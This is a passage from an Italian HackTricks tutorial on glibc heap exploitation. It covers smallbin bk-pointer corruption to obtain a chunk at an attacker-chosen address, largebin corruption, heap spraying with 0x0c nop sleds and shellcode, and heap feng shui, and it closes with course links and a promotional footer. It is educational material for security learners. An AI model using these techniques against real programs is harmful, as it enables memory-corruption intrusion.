I pezzi liberati vengono inseriti nel bin in base alla loro dimensione. Ma prima di essere inseriti vengono conservati in unsorted bins. Un pezzo liberato non viene immediatamente inserito nel suo bin ma rimane in unsorted bins. Successivamente, se viene riservato un nuovo pezzo e il precedente liberato pu√≤ servire, viene restituito, ma se viene riservato un pezzo pi√π grande, il pezzo liberato in unsorted bins viene inserito nel suo bin appropriato.

Per raggiungere il codice vulnerabile, la richiesta di memoria deve essere maggiore di av->max\_fast (di solito 72) e inferiore a MIN\_LARGE\_SIZE (512).

Se nel bin c'√® un pezzo della dimensione adeguata a ci√≤ che viene richiesto, viene restituito dopo essere stato scollegato:

bck = victim->bk; Puntatore al pezzo precedente, √® l'unica informazione che possiamo alterare.

bin->bk = bck; Il penultimo pezzo diventa l'ultimo, nel caso in cui bck punti allo stack al prossimo pezzo riservato verr√† assegnato questo indirizzo

bck->fd = bin; Si chiude la lista facendo s√¨ che punti a bin

√à necessario:
Riservare due malloc in modo che il primo possa essere sovraffollato dopo che il secondo √® stato liberato e inserito nel suo bin (cio√® √® stato riservato un malloc pi√π grande del secondo pezzo prima di fare l'overflow)

Il malloc riservato all'indirizzo scelto dall'attaccante deve essere controllato dall'attaccante.

L'obiettivo √® il seguente, se possiamo fare un overflow su un heap che ha sotto di s√© un pezzo gi√† liberato e nel suo bin, possiamo alterare il suo puntatore bk. Se alteriamo il suo puntatore bk e questo pezzo diventa il primo della lista del bin e viene riservato, il bin verr√† ingannato e gli verr√† detto che il prossimo pezzo della lista (il successivo da offrire) si trova all'indirizzo falso che abbiamo inserito (ad esempio nello stack o nella GOT). Quindi, se viene riservato un altro pezzo e l'attaccante ha permessi su di esso, verr√† dato un pezzo nella posizione desiderata e potr√† scriverci.

Dopo aver liberato il pezzo modificato √® necessario riservare un pezzo pi√π grande di quello liberato, in modo che il pezzo modificato esca dagli unsorted bins e venga inserito nel suo bin.

Una volta nel suo bin √® il momento di modificare il puntatore bk tramite l'overflow in modo che punti all'indirizzo che vogliamo sovrascrivere.

Quindi il bin dovr√† aspettare il suo turno affinch√© vengano chiamate a sufficienza le malloc() in modo che venga nuovamente utilizzato il bin modificato e inganni il bin facendogli credere che il prossimo pezzo si trovi all'indirizzo falso. E successivamente verr√† dato il pezzo che ci interessa.

Per eseguire la vulnerabilit√† il prima possibile, l'ideale sarebbe: riservare il pezzo vulnerabile, riservare il pezzo che verr√† modificato, liberare questo pezzo, riservare un pezzo pi√π grande di quello che verr√† modificato, modificare il pezzo (vulnerabilit√†), riservare un pezzo delle stesse dimensioni di quello violato e riservare un secondo pezzo delle stesse dimensioni e questo sar√† quello che punter√† all'indirizzo scelto.

Per proteggere questo attacco viene utilizzato il tipico controllo che il pezzo "non" sia falso: si controlla se bck->fd sta puntando alla vittima. Cio√®, nel nostro caso, se il puntatore fd\* del pezzo falso puntato nello stack sta puntando alla vittima. Per superare questa protezione, l'attaccante dovrebbe essere in grado di scrivere in qualche modo (probabilmente nello stack) nell'indirizzo corretto l'indirizzo della vittima. In modo che sembri un pezzo vero.

**Corruzione LargeBin**

Sono necessari gli stessi requisiti di prima e alcuni in pi√π, inoltre i pezzi riservati devono essere pi√π grandi di 512.

L'attacco √® simile a quello precedente, cio√® bisogna modificare il puntatore bk e sono necessarie tutte quelle chiamate a malloc(), ma inoltre bisogna modificare la dimensione del pezzo modificato in modo che quella dimensione - nb sia < MINSIZE.

Ad esempio, si far√† in modo che la dimensione sia 1552 in modo che 1552 - 1544 = 8 < MINSIZE (la sottrazione non pu√≤ essere negativa perch√© si confronta con un unsigned)

Inoltre √® stato introdotto un patch per renderlo ancora pi√π complicato.

**Heap Spraying**

Consiste essenzialmente nel riservare tutta la memoria possibile per gli heap e riempirli con un cuscino di nops terminati da una shellcode. Inoltre, come cuscino si utilizza 0x0c. Si cercher√† di saltare all'indirizzo 0x0c0c0c0c, e quindi se si sovrascrive un qualche indirizzo a cui verr√† chiamato con questo cuscino, si salter√† l√¨. Fondamentalmente la tattica √® riservare il massimo possibile per vedere se si sovrascrive qualche puntatore e saltare a 0x0c0c0c0c sperando che ci siano nops l√¨.

**Heap Feng Shui**

Consiste nel cementare la memoria mediante riserve e liberazioni in modo che rimangano pezzi riservati tra pezzi liberi. Il buffer da sovraccaricare sar√† posizionato in uno di questi pezzi.

## Corsi interessanti

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Riferimenti**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
